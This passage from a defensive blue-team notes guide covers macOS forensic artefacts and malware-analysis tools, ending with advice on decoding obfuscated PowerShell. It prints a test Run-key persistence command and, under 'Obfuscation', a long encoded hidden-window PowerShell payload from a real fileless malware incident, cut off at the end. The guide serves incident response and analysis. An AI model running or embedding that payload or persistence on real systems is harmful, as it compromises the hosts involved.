Notification from website can persist directly through the Safari web browser. These are saved to a plist and can be read/alerted from the plist itself.
```
plutil -p /Users/*/Library/Safari/UserNotificationPermissions.plist
```

The output will resemble with the `Permission` being a boolean value: `0 = denied` and `1 = allowed`.
```
{
  "https://twitter.com" => {
    "Date Added" => 2022-10-25 19:18:22 +0000
    "Permission" => 1
  }
  "https://drive.google.com" => {
    "Date Added" => 2022-11-03 18:58:35 +0000
    "Permission" => 1
  }
  "https://infosec.exchange" => {
    "Date Added" => 2023-02-15 19:32:33 +0000
    "Permission" => 1
  }
}
```

![image](https://github.com/Purp1eW0lf/Blue-Team-Notes/assets/72467868/4c868a43-41e9-4066-9944-c9930445f61d)

## Command line history

A couple places to retrieve command line activity
```
#will be zsh or bash
/Users/*/.zsh_sessions/*
/private/var/root/.bash_history
/Users/*/.zsh_history
```

![image](https://user-images.githubusercontent.com/44196051/170065955-d39bf1b9-3024-4ccb-8742-16e47f3cd145.png)

![image](https://user-images.githubusercontent.com/44196051/170065994-a12684f3-f847-49f1-b034-4f8f18105030.png)



## WHOMST is in the Admin group

Identify if someone has added themselves to the admin group

`plutil -p /private/var/db/dslocal/nodes/Default/groups/admin.plist`

![image](https://user-images.githubusercontent.com/44196051/170066042-9c382fa2-52df-43c8-aea9-457f05196a29.png)


## Persistence locations

Not complete, just some easy low hanging fruit to check. 

Can get a more complete list [here](https://gist.github.com/jipegit/04d1c577f20922adcd2cfd90698c151b)

```
# start up / login items
/var/db/com.apple.xpc.launchd/disabled.*.plist
/System/Library/StartupItems
/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm
/var/db/launchd.db/com.apple.launchd/*

# scripts
/Users/*/Library/Preferences/com.apple.loginwindow.plist
/etc/periodic/[daily, weekly, monthly]

# cronjobs / like scheduled tasks 
/private/var/at/tabs/
/usr/lib/cron/jobs/ 

# system extensions
/Library/SystemExtensions/

# loads of places for annoying persistence amongst daemons
/System/Library/LaunchDaemons/*.plist
/System/Library/LaunchAgents/*.plist 
/Library/LaunchDaemons/*.plist 
/Library/LaunchAgents/*.plist 
/Users/*/Library/LaunchAgents/*.plist 
```

![image](https://user-images.githubusercontent.com/44196051/170066210-ff6d6348-5b74-40fd-b7ef-f8a301653a33.png)
![image](https://user-images.githubusercontent.com/44196051/170066234-1e284ad6-7db7-4a10-a939-cb212571eb98.png)


## Transparency, Consent, and Control (TCC)

The TCC db (Transparency, Consent, and Control) offers insight when some applications have made system changes. There are at least two TCC databases on the system - one per user, and one root.

```
/Library/Application Support/com.apple.TCC/TCC.db
/Users/*/Library/Application Support/com.apple.TCC/TCC.db
```

You can use sqlite3 to parse, but there are values that are not translated and so don’t make too much sense


![image](https://user-images.githubusercontent.com/44196051/170066410-c620672d-36c0-4081-857f-2843be09aa07.png)

You can use some command line tools, or just leverage a tool like Velociraptor, use the dedicated TCC hunt, and point it at the tcc.db you retrieved.

![image](https://user-images.githubusercontent.com/44196051/170066448-d75a766f-25ca-489e-9596-1a1c4e006e16.png)

One of the most beneficial pieces of information is knowing which applicaitons have FDA (Full Disk Access), via the `kTCCServiceSystemPolicyAllFiles` service. This is _only_ located in the root TCC database.

![fulldiskaccess](https://user-images.githubusercontent.com/72467868/207419494-de3500ae-2da5-4af5-83c1-a1b80e5dd8f7.png)


## Built-In Security Mechanisms

There are some built-in security tools on macOS that can be queried with easy command line commands. This will get the status of the following.

```
# Airdrop
sudo ifconfig awdl0 | awk '/status/{print $2}'

# Filevault
sudo fdesetup status

# Firewall
defaults read /Library/Preferences/com.apple.alf globalstate  // (Enabled = 1, Disabled = 0)

# Gatekeeper
spctl --status

# Network Fileshare
nfsd status

# Remote Login
sudo systemsetup -getremotelogin

# Screen sharing
sudo launchctl list com.apple.screensharing

# SIP
csrutil status
 ```

---

# Malware
<details>
    <summary>section contents</summary>

  + [Rapid Malware Analysis](#rapid-malware-analysis)
  + [Unquarantine Malware](#Unquarantine-Malware)
  + [Process Monitor](#process-monitor)
  + [Hash Check Malware](#hash-check-malware)
  + [Decoding Powershell](#decoding-powershell)
  
</details>

I'd reccomend [REMnux](https://docs.remnux.org/), a Linux distro dedicated to malware analysis. If you don't fancy downloading the VM, then maybe just keep an eye on the [Docs](https://docs.remnux.org/discover-the-tools/examine+static+properties/general) as they have some great malware analysis tools in their roster. 

I'd also reccomend [FlareVM](https://github.com/mandiant/flare-vm), a Windows-based malware analysis installer - takes about an hour and a half to install everything on on a Windows VM, but well worth it!

## Rapid Malware Analysis

<details>
    <summary>section contents</summary>

  + [Thor](#thor)
  + [Capa](#capa)
  + [File](#file)
  + [Strings](#strings)
    - [floss](#floss)
    - [flarestrings](#flarestrings)
    - [Win32APIs](#win32apis) 
  + [regshot](#regshot)
  + [fakenet](#fakenet)
  + [Entropy](#entropy)
  + [Sysmon as a malware lab](#sysmon-as-a-malware-lab)
  
</details>

### Thor
[Florian Roth's](https://twitter.com/cyb3rops) Thor requires you to agree to a licence before it can be used. 

There are versions of Thor, but we'll be using [the free, `lite` version](https://www.nextron-systems.com/thor-lite/)

What I'd reccomend you do here is create a dedicated directory (`/malware/folder`), and put one file in at a time into this directory that you want to study.

```bash
#execute Thor
./thor-lite-macosx -a FileScan \ 
-p /Malware/folder:NOWALK -e /malware/folder \
--nothordb --allreasons --utc --intense --nocsv --silent --brd

#open the HTML report THOR creates
open /malware/folder/*.html
```

![image](https://user-images.githubusercontent.com/44196051/210364484-95aef50a-a57f-4b09-94de-d9d3461faad8.png)

### Capa
[Capa](https://github.com/fireeye/capa) is a great tool to quickly examine wtf a binary does. This tool is great, it previously helped me identify a keylogger that was pretending to be an update.exe for a program

Usage
```bash
./capa malware.exe > malware.txt
# I tend to do normal run and then verbose
./capa -vv malware.exe >> malware.txt
cat malware.txt
```
![image](https://user-images.githubusercontent.com/44196051/119991809-c1720300-bfc1-11eb-8409-6523a9b0019b.png)

Example of Capa output for the keylogger
![image](https://user-images.githubusercontent.com/44196051/119991358-44df2480-bfc1-11eb-9e6f-23ff445a4900.png)

#### File

The command `file` is likely to be installed in most unix, macOS, and linux OS'. Deploy it next to the file you want to interrograte

![image](https://user-images.githubusercontent.com/44196051/203073884-6cb75b6b-2e56-4022-b84e-e881d1556214.png)

`exiftool` may have to be installed on your respective OS, but is deplopyed similarly be firing it off next to the file you want to know more about

![image](https://user-images.githubusercontent.com/44196051/203073768-113b96fe-8f55-4f59-a94e-38b0f07e20d8.png)
![image](https://user-images.githubusercontent.com/44196051/203073793-48a81542-28af-4070-a44d-1db994a32bb6.png)

![image](https://user-images.githubusercontent.com/44196051/203073820-527290e8-a216-434e-9e2c-a1b7f19421e9.png)


### Strings
Honestly, when you're pressed for time don't knock `strings`. It's helped me out when I'm under pressure and don't have time to go and disassemble a compiled binary.

Strings is great as it can sometimes reveal what a binary is doing and give you a hint what to expect - for example, it may include a hardcoded malicious IP.

![image](https://user-images.githubusercontent.com/44196051/120565891-f2a96380-c405-11eb-925c-2471fa3673fe.png)

#### Floss
Ah you've tried `strings`. But have you tried [floss](https://github.com/mandiant/flare-floss)? It's like strings, but 
deobfuscate strings in a binary as it goes

```powershell
#definitely read all the functionality of floss
floss -h
floss -l

#execute
floss -n3 '.\nddwmkgs - Copy.dll'
```
---

![image](https://user-images.githubusercontent.com/44196051/144316548-d5a32ab2-a4de-42a8-8a5b-3ddad95c8325.png)

#### Flarestrings
[Flarestrings](https://github.com/mandiant/stringsifter) takes floss and strings, but adds a machnine learning element. It sorts the strings and assigns them a 1 to 10 value according to how malicious the strings may be.

```powershell
flarestrings.exe '.\nddwmkgs - Copy.dll' | 
rank_strings -s # 2>$null redirect the erros if they get in your way
```

![image](https://user-images.githubusercontent.com/44196051/144317691-6f9f360f-249d-46cb-aa27-33e2d3c8ee58.png)

##### Win32APIs
Many of the strings that are recovered from malware will reference Win32 APIs - specific functions that can be called on when writing code to interact with the OS in specific ways.

To best understand what exactly the Win32 API strings are that you extract, I'd suggest [Malapi](https://malapi.io/). This awesome project maps and catalogues Windows APIs, putting them in a taxonomy of what they generally do

![image](https://user-images.githubusercontent.com/44196051/144322643-15d117e6-4ba7-4a90-9563-7f61a47698e5.png)

### Regshot
[regshot.exe](https://github.com/Seabreg/Regshot ) is great for malware analysis by comparing changes to your registry.
- If your language settings have non-Latin characters (e.g. Russian, Korean, or Chinese), use unicode release

```powershell
#pull it
wget -usebasicparsing https://github.com/Seabreg/Regshot/raw/master/Regshot-x64-ANSI.exe -outfile regshot.exe
.\regshot.exe
 
#run the GUI for the first 'clean' reg copy. Takes about a minute and a half

#add something malicious as a test if you want
REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\evil.exe

## now run the GUI for the second time

# then run the comparison
Slightly noisy but does catch the reg changes. 
```
![image](https://user-images.githubusercontent.com/44196051/144318647-b922ab94-7ee2-4c8b-8879-d64867c63578.png)
![image](https://user-images.githubusercontent.com/44196051/144318442-6a5eef94-32a8-4f7e-bdb6-05747d49182d.png)

#### Registry snapshot via PwSh

Lee Holmes dropped some serious PowerShell knowledge in this Twitter exchange [1](https://twitter.com/Lee_Holmes/status/1521746929415122944/photo/1), [2](https://www.bleepingcomputer.com/news/microsoft/microsoft-powershell-lets-you-track-windows-registry-changes/). This takes longer than Regshot, but if you wanted to stick to PwSh and not use tooling you can. 

```powershell
#Base snapshot
gci -recurse -ea ignore -path HKCU:\,HKLM:\ | % {[PSCustomObject] @{Name = $_.Name; Values= $_ |out-string}} > base_reg.txt

## Execute malware

#New shapshot
gci -recurse -ea ignore -path HKCU:\,HKLM:\ | % {[PSCustomObject] @{Name = $_.Name; Values= $_ |out-string}} > new_reg.txt

#Compare
diff (gc .\test.txt) (gc .\test2.txt) -Property Name,Value
```


### Fakenet
Use [fakenet](https://github.com/mandiant/flare-fakenet-ng) in an Windows machine that doesn't have a network adapter. Fakenet will emulate a network and catch the network connections malware will try to make.

Fireup fakenet, and then execute the malware.
- Some malware will require specfic responses to unravel further. 
- I'd reccomend [inetsim](https://www.inetsim.org/downloads.html) where you encounter this kind of malware, as inetsim can emulate files and specific responses that malware calls out for

![image](https://user-images.githubusercontent.com/44196051/144321794-5771ee16-d3da-4ac2-b8e6-7644ec081f4e.png)

### Entropy
Determining the entropy of a file may be important. The closer to 8.00, it's encrypted, compressed, or packed. 

The linux command `ent` is useful here. `binwalk -E` is a posssible alternative, however I have found it less than reliable

The screenshot belows shows a partially encrytped file in the first line, and then a plain text txt file in the second line. 

![image](https://user-images.githubusercontent.com/44196051/151002519-bb540de0-509f-4746-b512-bc5a8a8f811c.png)

### Sysmon as a malware lab

Run this [script](https://gist.github.com/Purp1eW0lf/d669db5cfca9b020a7f7c982a8256deb), which will install Sysmon and Ippsec's Sysmon-steamliner script (powersiem.ps1)

Run powersiem.ps1, then detonate your malware. In PowerSiem's output, you will see the affects of the malware on the host

```powershell
#download script

wget -useb https://gist.githubusercontent.com/Purp1eW0lf/d669db5cfca9b020a7f7c982a8256deb/raw/4848ba4d32ccbf1ebeb62c8d3409fca2bcdf2799/Sysmon_Lab.ps1 -outfile ./Sysmon_Lab.ps1

#start sysmon lab
./Sysmon_Lab.ps1

#start powersiem.ps1
C:\users\*\Desktop\SysmonLab\PowerSiem.ps1

#detonate malware
```

![image](https://user-images.githubusercontent.com/44196051/203074507-c1dc874e-254a-4f2e-aa87-881ee0975cae.png)
![image](https://user-images.githubusercontent.com/44196051/203074562-ff4ee6d4-5beb-4cc8-9174-a9e0f9e76442.png)


## Unquarantine Malware
Many security solutions have isolation techniques that encrypt malware to stop it executing.

For analysis, we want to decrypt it using [scripts like this](http://hexacorn.com/d/DeXRAY.pl)

![image](https://user-images.githubusercontent.com/44196051/160846967-28e7746d-097a-4de9-a458-885222fcb2dc.png)

```perl
# install the dependencies
sudo apt update
sudo apt install libcrypt-rc4-perl

# pull the script
wget http://hexacorn.com/d/DeXRAY.pl

#execute the script
perl ./DeXRAY.pl x.MAL

```
![image](https://user-images.githubusercontent.com/44196051/160847093-23bc5813-eef9-4396-89cb-51a26e433e14.png)

And we get a working un-quarantined malware sample at the other side

![image](https://user-images.githubusercontent.com/44196051/160847179-6a5cdc33-d9d9-449e-993f-06fff0947d96.png)




## Process Monitor

<details>
    <summary>section contents</summary>

  + [Keylogger Example](#keylogger-example)
  
</details>


[ProcMon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is a great tool to figure out what a potentially malicious binary is doing on an endpoint.

There are plenty of alternatives to monitor the child processes that a parent spawns, like [any.run](https://any.run/). But I'd like to focus on the free tools to be honest.

### Keylogger Example
Let's go through a small investigation together, focusing on a real life keylogger found in an incident

#### Clearing and Filtering
When I get started with ProcMon, I have a bit of a habit. I stop capture, clear the hits, and then begin capture again. The screenshot details this as steps 1, 2, and 3. 

![2021-06-03_10-12](https://user-images.githubusercontent.com/44196051/120619727-2d39ed00-c454-11eb-80d3-4547928a1db6.png)

I then like to go to filter by process tree, and see what processes are running

![2021-06-03_10-20](https://user-images.githubusercontent.com/44196051/120620977-62930a80-c455-11eb-85e4-3062fbaadee4.png)

#### Process tree

When we look at the process tree, we can see something called Keylogger.exe is running!

![2021-06-03_10-23](https://user-images.githubusercontent.com/44196051/120621364-b7368580-c455-11eb-8af9-b2577e0113ce.png)

Right-click, and add the parent-child processes to the filter, so we can investigate what's going on

![2021-06-03_10-24](https://user-images.githubusercontent.com/44196051/120621605-eea53200-c455-11eb-9769-96e489708280.png)

#### Honing in on a child-process

ProcMon says that keylogger.exe writes something to a particular file....

![2021-06-03_10-27](https://user-images.githubusercontent.com/44196051/120621914-42178000-c456-11eb-8adf-a43f4249ed08.png)

You can right click and see the properties

![2021-06-03_10-30](https://user-images.githubusercontent.com/44196051/120622483-c2d67c00-c456-11eb-8746-ee8bb9a65bf6.png)

#### Zero in on malice

And if we go to that particular file, we can see the keylogger was outputting our keystrokes to the policy.vpol file

![2021-06-03_10-29](https://user-images.githubusercontent.com/44196051/120622218-8571ee80-c456-11eb-9b23-ed31ef4ec04e.png)

That's that then, ProcMon helped us figure out what a suspicious binary was up to!

---

## Hash Check Malware

<details>
    <summary>section contents</summary>

  + [Collect the hash](#collect-the-hash)
  + [Check the hash](#check-the-hash)
    - [Virus Total](#virus-total)
    - [Malware Bazaar](#malware-bazaar)
    - [Winbindex](#winbindex)

</details>

#### Word of Warning
Changing the hash of a file is easily done. So don't rely on this method. You could very well check the hash on virus total and it says 'not malicious', when in fact it is recently compiled by the adversary and therefore the hash is not a known-bad

And BTW, do your best NOT to upload the binary to VT or the like, the straight away. Adversaries wait to see if their malware is uploaded to such blue team websites, as it gives them an indication they have been burned. This isn't to say DON'T ever share the malware. Of course share with the community....but wait unitl you have stopped their campaign in your environment

### Collect the hash
In Windows
```powershell
get-filehash file.txt
# optionally pipe to |fl or | ft
```

In Linux
```bash
sha256sum file.txt
```
![2021-06-03_10-46](https://user-images.githubusercontent.com/44196051/120624759-e7335800-c458-11eb-9f67-4bfb1238f5f7.png)
![2021-06-03_10-54](https://user-images.githubusercontent.com/44196051/120625949-139ba400-c45a-11eb-997d-d6e33917efb5.png)


## Check the hash

### Virus Total
One option is to compare the hash on [Virus Total](https://www.virustotal.com/gui/home/search)

![image](https://user-images.githubusercontent.com/44196051/120631699-100b1b80-c460-11eb-87e7-bebe116b038a.png)

Sometimes it's scary how many vendors' products don't show flag malware as malicious....

![image](https://user-images.githubusercontent.com/44196051/120631921-5496b700-c460-11eb-8f02-3d276a74ed16.png)

The details tab can often be enlightening too

![image](https://user-images.githubusercontent.com/44196051/120632008-6d06d180-c460-11eb-9c19-758ef3bd9904.png)

### Malware Bazaar
[Malware Bazaar](https://bazaar.abuse.ch/) is a great alternative. It has more stuff than VT, but is a bit more difficult to use

You'll need to prefix what you are searching with on Malware Bazaar. So, in our instance we have a `sha256` hash and need to explicitly search that.

![image](https://user-images.githubusercontent.com/44196051/120632396-d4bd1c80-c460-11eb-94c3-af0f975d8b1f.png)

Notice how much Malware Bazaar offers. You can go and get malware samples from here and download it yourself. 

![image](https://user-images.githubusercontent.com/44196051/120632712-282f6a80-c461-11eb-8d84-7727d05df187.png)

Sometimes, Malware Bazaar offers insight into the malware is delivered too

![image](https://user-images.githubusercontent.com/44196051/120632964-7cd2e580-c461-11eb-8a37-1dcf3506f90e.png)

### Winbindex

[Winbindex](https://winbindex.m417z.com) is awesome. The info behind the site can be read [here](https://m417z.com/Introducing-Winbindex-the-Windows-Binaries-Index/). But in essence, it's a repo of official Windows binaries and their hashes.

We've already discussed it about [Drivers](#driver-queries) and [DLLs](#verify), so I won't go into too much detail. This won't give you an insight into malware, but it will return what the details of an official binary should be.

This is powerfull, as it allows us to know what known-goods should look like and have. 

![image](https://user-images.githubusercontent.com/44196051/121807829-b8359700-cc4d-11eb-84c4-80a6ae927dc8.png)

If we click on _Extras_ we get insightful information about the legitimate filepath of a file, its timestamp, and more!

![image](https://user-images.githubusercontent.com/44196051/121807894-fb900580-cc4d-11eb-8ce9-9ca176626c54.png)

---

## Decoding Powershell

<details>
    <summary>section contents</summary>

  + [Straight Forward Ocassions](#straight-forward-ocassions)
  + [Obfuscation](#Obfuscation)
  + [Bytes](#bytes) 

</details>

I have some lazy PowerShell malware tips: 

###### Hex
if you see [char][byte]('0x'+ - it's probably doing hex stuff

And so use in CyberChef 'From Hex'

###### decoded but still giberish
if when you decode it's still giberish but you see it involves bytes, save the gibberish output as *.dat

And then leverage `scdbg` for 32 bit and speakeasy for 64 bit
- scdgb /find malice.dat /findsc # looks for shelcode and if that fails go down to....
- speakeasy -t malice.dat -r -a x64  

###### reflection assembly
load PwSh dot net code, and execute it

instead of letting it reflect:
[System.IO.File]::WriteAllBytes(".\evil.exe", $malware)


###### xor xcrypt
you can xor brute force in cyberchef, change the sample lentgh to 200. 
- You're probably looking for 'MZ....this program'
- and then from here you get the key you can give to XOR in cyberchef. 

A lof of PowerShell malware that uses XOR will include the decimal somewhere in the script. Use cyberchef's `XOR` and feed in that decimal. 

###### unzippping
Sometimes it's not gzip but raw inflate!

When something detects from base64 as Gzip, undo the Gzip filter and use the raw inflate instead. 


# tidying up
To tidy up you can change stupid CAmeLcaSE to lower case

And then in find and replace, replace semi-colon with ;\n\n to create space

### Straight Forward Ocassions

Let's say you see encoded pwsh, and you want to quickly tell if it's sus or not. We're going to leverage our good friend [CyberChef](https://gchq.github.io/CyberChef)


#### Example String

We're going to utilise this example string
```
powershell -ExecutionPolicy Unrestricted -encodedCommand IABnAGUAdAAtAGkAdABlAG0AcAByAG8AcABlAHIAdAB5ACAALQBwAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcACoAIgAgACAAfAAgAD8AIABJAG0AYQBnAGUAUABhAHQAaAAgAC0AbABpAGsAZQAgACIAKgBkAHIAaQB2AGUAcgBzACoAIgA= 
```

#### Setup CyberChef

Through experience, we can eventually keep two things in mind about decoding powershell: the first is that it's from base64 ; the second is that the text is a very specific UTF (16 little endian). If we keep these two things in mind, we're off to a good start.

We can then input those options in Cyberchef . The order we stack these are important! 

![image](https://user-images.githubusercontent.com/44196051/121333852-12162400-c911-11eb-92c4-11fec95b2a72.png)
<https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Decode_text('UTF-16LE%20(1200)')>

#### Decoding
In theory, now we have set up cyberchef it should be as easy as just copying the encoded line in right?

![image](https://user-images.githubusercontent.com/44196051/121334957-10992b80-c912-11eb-85d4-3776d5f62195.png)


Well. Nearly. 
For reasons (?) we get chinese looking characters. This is because we have included plaintext human-readable in this, so the various CyberChef options get confused.

So get rid of the human readable!

![image](https://user-images.githubusercontent.com/44196051/121335190-4807d800-c912-11eb-8092-a166c99b8bdf.png)

And now if we send it through, we get the decoded command!

![image](https://user-images.githubusercontent.com/44196051/121335283-5a821180-c912-11eb-9c7c-6be313878e48.png)


### Obfuscation

I had an instance where 'fileless malware' appeared on a user's endpoint. Whilst I won't take us all the way through that investigation, I'll focus on how we can unobfuscate the malware.

We have two guides of help: 
* [Reversing Malware](https://haxys.net/tutorials/reversing/powershell2/0-reverse/#:~:text=func_get_proc_address&text=This%20memory%20address%20is%20returned,declared%20in%20the%20function%20call)
* [Using cyberchef](https://medium.com/mii-cybersec/malicious-powershell-deobfuscation-using-cyberchef-dfb9faff29f)


#### Example string

Don't ....don't run this.

```powershell
#powershell, -nop, -w, hidden, -encodedcommand, JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMAFYAWABXAFcALwBpAFMAaABaACsARAByAC8AQwBEADUARQBBAE4AZQBFAEMASgBsAHUAUABJAHIAWABCAE4AdABnAEIAQgB6AEIANwBiAGgAUwBWAHEAdwByAEgAeABMAHYATAAyAE8AWgAyAC8ALwBjADUATgBwAEMAYgBuAGsANQBtAFcAcABvAFoASgBJAHQAYQB6AHYAcQBkAHgAYwBjADYAWgBSAGMANgBDAHkAMwBNAGgAaAA2AGgAMwBNAFcAYwBoAHAASABsAHUAVgB5AHIAVgBEAG8AWABQAFkAVgB4AGQAOQB5ADMAYwBtAGsAVAB1ADUAagBsAHgALwBuAGkAMgBhAFQAcwAyAFEAOAA5AC8ASQB3AEkAQwBXAGsAVQBjAFgAKwBWAHoAawBZAG8AUgBBADUAWABPAGQAKwBoADgATgBuAHgAUwBHAHoAVABHAGwAZABzAGMAawBKAEsANABwAEIAVwB6ADgANQBLAFoAOABWAFIANwBFAFoAbwBRADUAOQBkAHgASwB3AGQAZgBYAFkAbwBlAC8ARgBJAEIASQBvAHEAagA0AEwAdgBpADUANgBEAEwAUABmAHAANgA5AGQAdQBIAEkAYgBVAFoAWQBkADkAdgBVAGUAWgBFAEUAWABVAE0AVwB5AEwAUgBwAFUAcQA5ADUAMQBiAHYATgBDAFEAWABqAHcAWQBXADQAbwBaADkAeABkADMALwBsAHoAdgAyAFoANgBCADcAQwBOAFoAMQBrAFgANABCAFIAdwBTAFgASgBMAGYARABUAHkATQBjAGcALwBxAHUAbQA5AGIAcgBGAEwAKwA4ADgAOQB5ADkAZgBHAGkAKwBWAFMAWABnAGgAagBaAFUAYQBXAHMAWgB4AEcAagBUAHAAMwBZAGQAcgBuAEsALwBhAGoAbQBDAHEAZQBaAFQAeQB2AGwAbwBZAFYARABMAC8ASQAyAHIATAA2AHcAWABMADUAVgBuAHgAWABXAGEANABYAHgAdwA0AFAAdAA1AGUAcgBSAE0AOQBOAEgANABNAGYAbgBUAHUAWgBTAEQAegB5AFYATQBpAHgASABnAEkAMQB3AHcATABCAGMANAB4ADUAegBmAFkAOQBQAFQAOQB5ADMATgAyAHMAbQBzAGMAcwBzAGgAOQBZAFYAbAA5AEgAUQA4ADMAVQBhADcAaQB4AE0AbwAzAG8AZgB1AGMAUwBtAEUANwBvAEIAdABuAEkARQA0AFgAUABOAGMAaABXAE0AQwBDAG0ATABRADUAYwA3ADIAUQBKADgATwArACsAVgBWAHMANwBkADIATABaAHIASQBQAGYAeABkACsAVQArAFYAVABTAGEAbgBNAEQAOQBYAGEAYgBLAGUAeQBhAGcARwByAEcAdwBXAGoAdgBtAHgATwAvAEEATQBTAHoAeQA1AGkAQQBPADMAUABuAEYAKwBuAGYASgBWAFkAWABmAEwAdwBsAFcATABmADAAbwBmAFoAQwBxAGgATgByAFUAUgBJAHcAKwBNADgARAAzAFgAYQA2AFcAegBzADQAZQBpAHkAVQBGAGYAeQBvAGoATAA3AEkASwB2AGoAdQB1AFUAZQBPAEcAWQBBAFIAaQBYAHAAagBsADQAWgB5AEcATQBhADAAKwAvAFIAMgBmAGcAOQBvAFQAWgAxAFQANwBWAEYARAB6AHgASABYAGsATwBZAFQAbgBZAE0AYwBkADkAegBqADMATABQAEoAVQBPAHEAdQBXAGoAdABtAFQAbgB6ADgAYgBzAFcAVQBUAEcAdQBiADMAbgAxAGUARABTAEQAZQBXAFMAOABYAE0AUgBZADYARgBUAHcAbABmACsAUwBoAG0AZABHAFAAVABBAG8ALwA2AGkAVQB3AEQATwB5AHYAbAA0AHcAVQBsADQAaABHAGQAYwBnADcAbwA0ADYAOQBzAGsAbQBPAHgATgA5ADcATwB3AFQAZwBCAFEAOQB3AGoAcwBBAHAAUwBvAHYAcQB6AE0AWQBjAFkAVgBzAHEASwBPADYAUQBPADQASABmAFkAUQA1AHEAZQBiADYARABNADYASQBuADYAVwBGAHIAWgBTAFgAdQArAHoAMwBPADUAYQA2AE0AbwBxAG4ARwBqAEcATwBvAGMAMQB6AGkAZABJAHAAdQBTAEcAaQBlADQAawBYAFcAOABFAG0ATABtAEYAYwB2AHkAMwArAFkATwBZADUAdABaAEcARQBYAHMASgBPADYAcAArAGcARwBrAFIAOQBWAGQAegA0AFcASwBpAFQARgBFAEYAMgBDAFkANgBqADcARgBGAHIASgB6AFYARwBwAGMAMwB5AEsAMABrACsAbQBXAGUAVABLAGgALwBDAEUAbQBYAFcAVABiAFUASABJAGcAYQBRAGMAeABnAFoATQBjAEMANQAzAGwATwBSAE8AUwAyAHIALwBtAFIANwBXAHUAVQA2AFkANAB2AGsAMABkAG8AQwA2ADYAawBHAHcAagBFADMAcgBPAHMAYQBLAEsAZABFAE0AbQBKAGUAVgAvAFkALwBhAHAAVABnADUARgBrAFcATgAxAEEAdQBtAGQAMABaAEEAQQB1AHUAMgB4AEcAagBlADMAUQBnAFoAOQByAFYAegA3AEoAZgBIACsATwAvAE4AKwBiAGoARQAvAG0AZABrAE4ANgBUAEcAUQBsAGEASQBRAEgAegBzAFoAeQA4AHUAbABvAE0AVAA1AHkAKwBYAHUARABjAHMAQwB1AFoAQQBCAGEAbgBMAG8ATwBSADAAVQAwAGEAdQAyAFgAcgBTAHgAUwBwAG0ALwBpAFEATQBsAEcAMgA3AEgAVgAyAEYAUAAyAHMAbgA5AG8AQwA5AE4ANABkAG4AQgB3AHcAZQB5AE4AQgBpAG8ARQA3ADgAegBHAFcAQQBwAGYAaABqADEARwArAHAARwBHAGQAKwBJADcAVABpAEoAbABYAGoAYQBhAGYAQgB5AEEAKwBqADIAUQBVAC8AYQBLAEwAcwBIAGIAOQBXAE0AbgBYAGEAVAArAE0AcABPAGcANwBQAG8ATwB1AGgASABvAHIASQBUAGgAWAA0AHIAOABPAFEAcgAwADcAbwA5AHkAagBuAHcAagA0ADIAawBhAFMAdwBWACsAZAByAG8AeQBlADMAKwBQAEoASgB6ACsAcgA2AHkANgA4AGgAQgA5ADkAYQBEADkAUgAvAEsAcgB1AHUAcAB3AEgAZAB6ADUAYgB1AGQAaABMAFMAcABwAEYANwBSADUAUQBBAG4AUABMAHUAaAB5AEUAeQB6ACsALwBrAFgAdgBkAEgAcwB6AFQATgB0AE0ASgBkADgAVABYAGYASgB3AEcAaQBPAFoAVgBYAGIAdAB6AEwAdwBDAGYAegBTACsAZgA2AGsAUQBlAEQAUgBVADcAdQA1ADgASwBiADQATgBnAHIANgB1AGIAKwAwAE0AdwBpAHcAcQA2AHAASwBYADgAMQAwAGYAdAB4AFcATQBpADMAQgBEAGQAWQBJAHcAcgAzAE4AagA5AGIANwBMAEwAZwBCAGYAcQAwAE4AbQBLAFIANgBOAHAAeQAwAHIAMABpAEsAbAAzAEsAQwBsADkAbwBnADYANgArADAASAB1AGcASQA0AG8AWABaADcAbQBzAEQATAB4AFcAMgB5AGwAVQBvADYAagByAFoANgA5AE8AMABxAFQAZgBYADkAZwA0AHQAOABhADIAYgBGAFAAcAAxAGsAaQBaAGsARgBqADIAbwBVADcAYgBpAFIAOABoAHAAWgA1AGwANwBwAFMAdABiAEoAUgAxAGcAbgA4ADIAWAA2AGwAVwBJAHMAcQA0AC8AcwBLAGoAUgAyAGIAQgBjAHIAagBwAFkAbQArAHEAdABCAEcAdQBKAHAAUQAxAGQAbgAyAFEARQA5AE4AcgA5AHEAWABnAFAAZQB0ADMAdQBjAEEAZwArAG8ARQB0ADUAOQBVAHIANQAwAGYAMQBDADIAMgBPACsATQA4AEIAWgBxAEYAaABLAE4AcgBxAC8AcwBrAEQAMgBEAFIAdgB5AGMAQwA1AEsANgBqAFYAeQBYADcAZQB5AGsAMwBSAHgAcwB0ADYAdQBYAEsAMAB0ADgANwBkADcAdQBvAHcAVwBjAHMATAAyAG0ANwBFADMAVwAvAFcARQBlAHgAbABpAHMASABaADgAYwArAFYASwBEADcAaABQAEwARwBOAEIATABMAHoAQQBEAHkAdQBuAHkAUwBOADMASAB1AEQAbABPAGgARgBkADQAdQBBACsAZgBsAGcAdgAvAE4AMwBhAFYAUABvAG8AZQBRAG0ANwArAG4AQgBoAEMATwBxACsAWQAyAG0AdABtAGIAUwBlAGkASQA0AHEAVABWADYAYgB5ADkANQBZAGkANgBlAHkAZgBUADkAdAAzAEgAYgBGAHoAawBxAFQAawB1AEYAZwBMAEsAVQBQAHMANABhADYAMQBGAC8AbAAwAGUAVABGAEYAQQAyADMARQA2AHoATgBJAFIASQBuAHcANQBYAEEAVAArADYAbgBNAHoASwBjAHkANABKAG8ATABMAEUAbwBqAHgAdAA2AFQAOQBBAGEAKwBtAHQAagBMAHEAZQBtAHUARQBoAG4AUwA5AGoAegBzADUAbgBmAHoAKwBVAFgATQB1AEYAOAB0AFUAaQBEADkAWQB1ADMAVwBqAHYATgBGAGgAYQA4ACsAUAA1AGsAagA2AE4AWgBtAEQAZQBYAEcAMQA2ADcAcABPAGwAcQAyAGUAVwAxADIA